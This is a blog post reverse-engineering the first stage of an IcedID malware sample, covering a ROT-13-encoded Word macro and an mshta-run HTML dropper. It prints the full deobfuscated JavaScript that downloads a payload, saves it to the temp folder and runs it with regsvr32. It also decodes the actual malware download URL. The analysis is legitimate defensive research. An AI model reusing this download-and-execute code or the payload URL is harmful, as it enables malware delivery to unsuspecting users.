---
layout: post
title: "Analysing IcedId: The macro and Mshta"
summary: "Analysing the macro and Mshta in the docx file"
date:   2020-09-05 17:40:00 -0400
categories: Reverse engineering
---

# Analysing IcedID malware

## Context
I was looking up for a malware to analyse just for fun. One day, I've saw a post on twitter from [Suspicious Link](https://twitter.com/reecdeep/status/1300432198135418880), when there was a link to the [app.any.run](https://app.any.run/tasks/d52f66be-14f1-47fc-ad3b-77c89c0e2b77/) sample. I thought it would be an opportunity to check out the sample. I'll describe in future posts the analysis. This first part is quite incomplete as the macro and the Mshta are really simple - I was expecting more work to do.

The md5 hash file is `87e3a3829c723650bea2110ea75a43cd`.

## Casual phishing
By opening the `doc` file, we are greeted with the classic "Please run the macro". Let's just dive into the macro.

## Lolz at the encoding
When looking at the strings in the macro, we can see at least three that catch the eye.

``` vb
Public Const al9h8L As String = "p_:_\_j_v_a_q_b_j_f_\_f_l_f_g_r_z_3_2_\_z_f_u_g_n_._r_k_r_"
Public Const as2QC As String = "P_:_\_h_f_r_e_f_\_c_h_o_y_v_p_\_v_a_._p_b_z_"
Public Const akJ8O5 As String = "P_:_\_h_f_r_e_f_\_c_h_o_y_v_p_\_v_a_._u_g_z_y_"
```

Using our experimented ctfs skills, we can guess a ROT encoding.

```
c_:_\_w_i_n_d_o_w_s_\_s_y_s_t_e_m_3_2_\_m_s_h_t_a_._e_x_e_
C_:_\_u_s_e_r_s_\_p_u_b_l_i_c_\_i_n_._c_o_m_
C_:_\_u_s_e_r_s_\_p_u_b_l_i_c_\_i_n_._h_t_m_l_
```

And it is indeed a ROT-13 encoding. From this point, another wild guess is the macro will create a `html` file and will execute `mshta` on that file, probably dropping another file on the filesystem. There's a big blob of text in the `UserForm1`, starting with `<!QBPGLCR`, which again translates to `DOCTYPE` using the rot-13. We can get the content and translate it using our vim foo, `g?`.

## Quick and dirty mshta analysis

_Reversing_ the `html` file can be done within minutes. I'll explain how I did it, and a more thorough analysis will follow some day.

There's `p` element containing what seems to be a hex encoded blob, starting with

``` html
<p id="content">616e75637272416e756372725[...]</p>
```

This blob should be used somewhere, and we can follow the reference. Another thing is that there's only one function in the JavaScript, and it only converts a string passed in parameter.

``` js
function aQp7I(aXmFa)
{
        var al3VX = "";
        for(var a8tBHG = 0; a8tBHG < aXmFa.length; a8tBHG += 2)
        {
                al3VX += String.fromCharCode(parseInt(aXmFa.substr(a8tBHG, 2), 16));
        }
        return(al3VX);
}
```

By adding a `console.log(al3VX);` right before the `return`, one can get the output of the function.


By following the `content` tag, we will first get to `var aGml5p = document.getElementById("content");`. Following the `aGml5p` variable, we get to `amqBO.RegWrite(a8X0v, aGml5p.innerHTML, "REG_SZ");`. So, the file will create a registry key and put the value of `content` in it. Following references to `amqBO` lead to `a8fnhv = amqBO.RegRead(a8X0v)`. This can be simplified as `a8fnhv = content`.

Next, `a8fnhv = aQp7I(a8fnhv);`. Our function is called! What happens next: `a8fnhv = a8fnhv.replace(/nucrr/ig, "");`, then `var azKf2 = new Function("u", "c", a8fnhv);`. Let's see what's the result of the content after being passed to the `aQp7I` function and after the regex removes some `nucrr` occurrences.

``` js
aAT1V6 = true;var avN2J = "aBUo3";var aZAeCP = avN2J.length;function ar9sv(ahf1a){var avFW1R = "";for(var axF8yP = 0; axF8yP < ahf1a.length; axF8yP += 2){avFW1R += String.fromCharCode(parseInt(ahf1a.substr(axF8yP, 2), 16));}return(avFW1R);}var aqNek = true;aFM47o = false;akS0L = 30444;function a2uAHR(avFW1R){return(avFW1R.split("").reverse().join(""));}var aAgDpY = -38781;var a8D1v = 47284;var ae2PS = 12708;aZacTF = "anUX4L";a5WNsd = aZacTF.toLowerCase();var avAZG = new ActiveXObject("msxml2.xmlhttp");var aZHhk = -12863;var apgUz = true;var aGnoB = new ActiveXObject("adodb.stream");var aFqyH = "aiXJ3";a8Nh59 = aFqyH.toUpperCase();aYdVD = true;apeFM = -58349;am5UGu = true;var arfAe = new ActiveXObject("wscript.shell");aLzZH7 = "aiPOsk";a0zBvV = aLzZH7.toUpperCase();avc2fk = "aG2REl";var aLhWt = avc2fk.toUpperCase();advOnm = arfAe.expandenvironmentstrings("%temp%");var a4btjU = "aSbLM";arpdw4 = true;var a72X8Q = -9230;a1TIE = "ackdmA";aDyvj = a1TIE.length;aqzl3 = -10026;var a7bNS = true;var aWI9yB = -30060;asC6iW = advOnm + String.fromCharCode(92) + "temp.tmp";aH3r4a = 6567;var aTrpB8 = 29087;a7fBn = "azidx0";var auyeo = a7fBn.length;aWg3M5 = "aga8Eq";var aeoOT = aWg3M5.toString();u = a2uAHR(u);u = ar9sv(u);amgJz = "ab3kae";var aq6RX4 = 27911;a4XbQ = false;alWXi4 = 17174;var aomJe = false;avAZG.open("GET", u, 0);a56hyl = "aAUEH";a5fQJ = a56hyl.toString();ay7M0 = 42712;avAZG.send();var aSWdj = true;aBmLaY = false;var aGtzeA = true;amycHJ = 57325;if(avAZG.status == 200 && avAZG.readystate == 4){aVKxoP = "a6EcBb";a9Ahm = true;aghV4 = 25593;aGnoB.open();var aoT0lb = "ao9alG";var atEXd = aoT0lb.toLowerCase();aGFh46 = "awHIaN";aZQG4x = true;aGnoB.type = 1;var akhf1r = -60377;var a5bTI4 = "aEtViT";a0PURS = a5bTI4.toLowerCase();aqPVoX = 37966;aGnoB.write(avAZG.responsebody);var aLcXn = "aqaMj";var aiJeY = aLcXn.toLowerCase();var akGjxP = "aq6hR";var aQYR4 = akGjxP.toString();aGnoB.savetofile(asC6iW, 2);aE7YPR = "aCAn4";var aJzQTj = aE7YPR.toLowerCase();var aIwRn = true;var aymPM = "aZX5cz";ayTmvz = aymPM.length;var aAB9zw = 33034;aGnoB.close();}var aKIfHa = 23124;ae8Er = false;aHWAg9 = 23639;axmdR = -55362;var aTcA8 = "azwPNu";var a783M = false;aNYIum = 42243;aK5rL = "auSLK";var an6T32 = aK5rL.toString();arfAe.run("regsvr32 " + asC6iW);a4B5z = "a57uH";var a2iHw = a4B5z.toLowerCase();aFWqP = 51428;var a0n1U = -21061;
```

Quickly, we can assume a HTTP request will be made, because of the `var avAZG = new ActiveXObject("msxml2.xmlhttp");`. It might also execute a PE file using the `arfAe.run("regsvr32 " + asC6iW)`. We can beautify the new JavaScript blob and read it. Two functions exist, and both are easy to understand:

``` js
function ar9sv(ahf1a) {
	var avFW1R = "";
	for (var axF8yP = 0; axF8yP < ahf1a.length; axF8yP += 2) {
		avFW1R += String.fromCharCode(parseInt(ahf1a.substr(axF8yP, 2), 16));
	}
	return (avFW1R);
}
```


``` js
function a2uAHR(avFW1R) {
	return (avFW1R.split("").reverse().join(""));
}
```

As the JavaScript code is only a hundred long lines, let's check out where `avAZG` is used. `avAZG.open("GET", u, 0);`, and what is the `u` variable? `u = a2uAHR(u); u = ar9sv(u);`. `u` seems to be undefined. Let's go back to the other html part. `var azKf2 = new Function("u", "c", a8fnhv);`. Good! Where is `azKf2` used? `azKf2("261636e203136656c6f6d6d3c6f3078607e257775786f24616071637f2d6f636e296172787a717f2f2a307474786", 0);`. Now, let's just manually pass `261636e203136656c6f6d6d3c6f3078607e257775786f24616071637f2d6f636e296172787a717f2f2a307474786` to `azKf2` as such, and then run the JavaScript code:

``` js
u = a2uAHR("261636e203136656c6f6d6d3c6f3078607e257775786f24616071637f2d6f636e296172787a717f2f2a307474786");
u = ar9sv(u);
console.log(u);
```

``` bash
$ js test.js 
http://qzxrqi.com/sapad/huwu.php?l=molef10.cab
```

And we got our next file! 

``` bash
$ file molef10.cab
molef10.cab: PE32 executable (DLL) (GUI) Intel 80386, for MS Window
```

Now shall start the fun!
